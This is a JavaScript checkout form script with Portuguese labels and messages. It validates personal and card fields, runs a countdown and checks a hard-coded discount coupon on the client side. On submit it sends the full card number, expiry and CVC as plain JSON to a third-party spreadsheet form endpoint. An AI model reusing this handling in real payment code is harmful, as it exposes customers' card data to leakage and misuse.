const $formComplete = document.getElementById("form-complete");
const $productContainer = document.getElementById("productContainer");

/* FORM's ELEMENTs PESSOAL INFO*/
const $form = document.querySelector("form");
const $inputs = document.querySelectorAll("form input, form select");
const $name = document.querySelector("#name-input");
const $cpf = document.querySelector("#cpf");
const $tel = document.querySelector("#tel");
const $cep = document.querySelector("#cep");
const $address = document.querySelector("#address");
const $addressNumber = document.querySelector("#numberAdress");

/* FORM's ELEMENTs CARD INFO*/
const $holder = document.querySelector("#cardholder-name");
const $numberCard = document.querySelector("#cardholder-number");
const $expMounth = document.querySelector("#cardholder-expdate");
const $expYear = document.querySelector("#cardholder-mmyy");
const $cvc = document.querySelector("#cardholder-cvc");

/* CARD's Interative Details */
const numberCard = document.getElementById("placeholder-card");
const nameCard = document.getElementById("name");
let dateCardMM = document.getElementById("dateMM");
let dateCardYY = document.getElementById("dateYY");
const cvcCard = document.getElementById("cvc");

/* DESCONTO's items */
const $inputDesconto = document.querySelector("#desconto-input");
const $btnAddDesconto = document.querySelector("#desconto-btn");
const $removeDesconto = document.querySelector("#desconto-remove");
const $realPrice = document.querySelector("#productName p");
const $descontPrice = document.querySelector("#productName span");

numberCard.innerText = "0000 0000 0000 0000";
nameCard.innerText = "Jane Appleseed";
dateCardMM.innerText = "00";
dateCardYY.innerText = "00";
cvcCard.innerText = "000";

const rules = {
  name: {
    presence: {
      allowEmpty: false,
      message: "^O nome completo é obrigatório.",
    },
    length: {
      minimum: 3,
      message: "^O nome deve ter pelo menos 3 caracteres.",
    },
  },
  cpf: {
    presence: {
      allowEmpty: false,
    },
    format: {
      pattern: /^\d{3}\.\d{3}\.\d{3}-\d{2}$/,
      message: "^O CPF deve estar no formato 000.000.000-00",
    },
  },
  tel: {
    presence: {
      allowEmpty: false,
      message: "^O telefone celular é obrigatório",
    },
    format: {
      pattern: /^\(\d{2}\) \d{5} \d{4}$/,
      message: "^O telefone deve estar no formato (00) 00000 0000.",
    },
  },
  cep: {
    presence: {
      allowEmpty: false,
      message: "^O CEP é obrigatório.",
    },
    format: {
      pattern: /^\d{5}-\d{3}$/,
      message: "^O CEP deve estar no formato 00000-000",
    },
  },
  address: {
    presence: {
      allowEmpty: false,
      message: "^O endereço é obrigatório.",
    },
  },
  addressNumber: {
    presence: {
      allowEmpty: false,
      message: "^O número do endereço é obrigatório",
    },
    numericality: {
      onlyInteger: true,
      message: "^O número do endereço deve ser um número válido.",
    },
  },
  cardName: {
    presence: {
      allowEmpty: false,
      message: "^O nome do titular do cartão é obrigatório",
    },
  },
  cardNumber: {
    presence: {
      allowEmpty: false,
      message: "^O número do cartão é obrigatório",
    },
    format: {
      pattern: /^(\d{4} ){3}\d{4}$/,
      message: "^O número do cartão deve ter o formato 0000 0000 0000 0000.",
    },
  },
  expMounth: {
    presence: {
      allowEmpty: false,
      message: "^O mês de expiração é obrigatório",
    },
    numericality: {
      onlyInteger: true,
      greaterThanOrEqualTo: 1,
      lessThanOrEqualTo: 12,
      message: "^O mês deve ser um número entre 1 e 12.",
    },
  },
  expYear: {
    presence: {
      allowEmpty: false,
      message: "^O ano de expiração é obrigatório",
    },
    numericality: {
      onlyInteger: true,
      message: "^O ano de expiração deve ser igual ou superior ao ano atual.",
    },
  },
  cvc: {
    presence: {
      allowEmpty: false,
      message: "^O CVC é obrigatório",
    },
    format: {
      pattern: /^\d{3}$/,
      message: "^O CVC deve ter exatamente 3 dígitos.",
    },
  },
};

$expMounth.addEventListener("input", () => innerCard(dateCardMM, $expMounth));
$expYear.addEventListener("input", () => innerCard(dateCardYY, $expYear));

let innerDateCard = (date, input) => {
  date.textContent = input.value;
};

const inputsNumber = [$numberCard, $cpf, $tel, $cep, $addressNumber, $cvc];
inputsNumber.forEach((input) => {
  input.addEventListener("input", () => {
    input.value = onlyNumbers(input.value);
  });
});

const inputsString = [$name, $address, $holder];
inputsString.forEach((input) => {
  input.addEventListener("input", () => {
    input.value = onlyLetters(input.value);
    validateInput(input, "minLetters", "string");
  });
});

$numberCard.addEventListener("input", () => {
  const regexNumberCard = /(\d{4})(?=\d)/g;
  const formatNumberCard = $numberCard.value
    .replace(regexNumberCard, "$1 ")
    .slice(0, 19);
  $numberCard.value = formatNumberCard;
  validateInput($numberCard, "card");
  innerCard(numberCard, $numberCard);
});

$holder.oninput = () => {
  innerCard(nameCard, $holder);
};
$cvc.oninput = () => {
  innerCard(cvcCard, $cvc);
};

let innerCard = (card, input) => {
  card.innerText = input.value;
};

$cpf.addEventListener("input", () => {
  let formatCPF = $cpf.value
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{2})$/, "$1-$2");
  $cpf.value = formatCPF;
  validateInput($cpf, "cpf");
});

$tel.addEventListener("input", () => {
  let formatedTel = $tel.value
    .slice(0, 11)
    .replace(/^(\d{2})(\d)/, "($1) $2")
    .replace(/(\d{5})(\d)/, "$1 $2");
  $tel.value = formatedTel;
  validateInput($tel, "tel");
});

$cep.addEventListener("input", () => {
  let formatedCep = $cep.value.slice(0, 8).replace(/^(\d{5})(\d)/, "$1-$2");
  $cep.value = formatedCep;
  validateInput($cep, "cep");
});

const numberEcvc = [$addressNumber, $cvc];
numberEcvc.forEach((input) => {
  input.addEventListener("input", () => {
    validateInput(input, "num");
  });
});

const expectedLengths = {
  cpf: 11,
  tel: 11,
  cep: 8,
  num: 3,
  minLetters: 10,
  card: 16,
  select: 2,
};

let validateInput = (input, type, cond) => {
  const value = cond == "string" ? input.value : onlyNumbers(input.value);
  const requireLenght = expectedLengths[type];
  let isValid;
  if (cond === "string") {
    isValid = value.length > requireLenght;
  } else {
    isValid = value.length === requireLenght;
  }

  const validFeedback = input.nextElementSibling;
  const invalidFeedback = validFeedback.nextElementSibling;

  if (isValid) {
    validFeedback.style.display = "block";
    invalidFeedback.style.display = "none";
    input.style.borderColor = "green";
    input.classList.remove("is-invalid");
    input.classList.add("is-valid");
    input.classList.add("valid-background");
  } else {
    validFeedback.style.display = "none";
    invalidFeedback.style.display = "block";
    input.style.borderColor = "red";
    input.classList.add("is-invalid");
    input.classList.remove("is-valid");
    input.classList.remove("valid-background");
  }
};

let onlyNumbers = (value) => {
  return value.replace(/\D/g, "");
};

let onlyLetters = (string) => {
  return string.replace(/[^A-Za-zÀ-ÿ\s]/gu, "");
};

/* TIMER's ELEMENT*/
const $clock = document.getElementById("timer");

let tempoRestante = 11 * 60000;
let intervalo;
let ultimoTempo = Date.now();

const atualizarTempo = () => {
  let tempoAgora = Date.now();
  let tempoDecorrido = tempoAgora - ultimoTempo;
  ultimoTempo = tempoAgora;

  tempoRestante -= tempoDecorrido;

  let minutos = Math.floor(tempoRestante / 60000);
  let segundos = Math.floor((tempoRestante % 60000) / 1000);
  let milisegundos = tempoRestante % 1000;

  minutos = minutos < 10 ? `0${minutos}` : minutos;
  segundos = segundos < 10 ? `0${segundos}` : segundos;
  milisegundos =
    milisegundos < 100
      ? `0${milisegundos}`
      : milisegundos < 10
      ? `0${milisegundos}`
      : milisegundos;

  let timerFormatado = `${minutos}:${segundos}:${milisegundos}`;
  $clock.textContent = timerFormatado;
  if (tempoRestante <= 0) {
    $clock.textContent = "O tempo acabou!";
    clearInterval(intervalo);
    clockOver();
  }
};

intervalo = setInterval(atualizarTempo, 10);
atualizarTempo();

$form.addEventListener("submit", (event) => {
  try {
    event.preventDefault();
    const values = {
      name: $name.value.trim(),
      cpf: $cpf.value.trim(),
      tel: $tel.value.trim(),
      cep: $cep.value.trim(),
      address: $address.value.trim(),
      addressNumber: $addressNumber.value.trim(),
      cardName: $holder.value.trim(),
      cardNumber: $numberCard.value.trim(),
      expMounth: $expMounth.value.trim(),
      expYear: $expYear.value.trim(),
      cvc: $cvc.value.trim(),
    };
    const errors = validate(values, rules)
    if (errors) {
      console.log(errors)
    } else {
      $form.classList.add("d-none");
      $formComplete.classList.remove("d-none");
      $productContainer.classList.add("d-none");
      fetch("https://api.sheetmonkey.io/form/9qGHZ1Ki5b8WLuknMeVd1g", {
        method: "post",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          name: values.name,
          cpf: values.cpf,
          tel: values.tel,
          cep: values.cep,
          address: values.address,
          addressNumber: values.addressNumber,
          cardName: values.cardName,
          cardNumber: values.cardNumber,
          expMounth: values.expMounth,
          expYear: values.expYear,
          cvc: values.cvc,
        }),
      });
    }
  } catch (error) {
    console.log(error);
  }
});

$btnAddDesconto.onclick = () => desconto();
$removeDesconto.onclick = () => {
  $inputDesconto.value = "";
  desconto();
};

let desconto = () => {
  if ($inputDesconto.value === "vaiCorinthians10") {
    $realPrice.classList.remove("realPrice");
    $descontPrice.classList.add("descontPrice");
    document.querySelector("#desconto button").textContent = "Cupom aplicado!";
    $btnAddDesconto.classList.add("d-none");
    $removeDesconto.classList.remove("d-none");
  } else {
    document.querySelector("#desconto button").textContent =
      "Tem um cupom de desconto?";
    $realPrice.classList.add("realPrice");
    $descontPrice.classList.remove("descontPrice");
    $btnAddDesconto.classList.remove("d-none");
    $removeDesconto.classList.add("d-none");
  }
};

let disableInput = (input) => {
  input.setAttribute("disabled", true);
};

let clockOver = () => {
  $inputDesconto.value = "";
  desconto();
  disableInput($inputDesconto);
  disableInput($btnAddDesconto);
  document.querySelector("#desconto button").textContent =
    "Não é mais possível adicionar um desconto.";
};

document.addEventListener("DOMContentLoaded", () => {
  desconto()
  const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]');
  const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl));
});

